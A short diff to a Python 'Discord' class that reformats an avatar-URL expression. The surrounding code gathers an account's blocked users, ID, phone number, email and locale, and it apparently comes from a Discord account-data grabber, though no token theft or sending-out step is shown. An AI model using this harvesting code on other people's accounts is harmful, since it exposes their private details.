@@ -193,9 +193,11 @@ class Discord:
             blocked_count = len([f for f in friends if f['type'] == 2])
             blocked_users = [f'{f["user"]["username"]}#{f["user"]["discriminator"]}' for f in friends if f['type'] == 2]
             discord_id = user['id']
-            avatar_url = f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif" \
-                if requests.get(f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif").status_code == 200 \
+            avatar_url = (
+                f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif"
+                if requests.get(f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif").status_code == 200
                 else f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.png"
+            )
             phone = user['phone'] if user.get('phone') else ":x:"
             email = user['email']
             language = user.get('locale', 'en-US').split('-')[0]
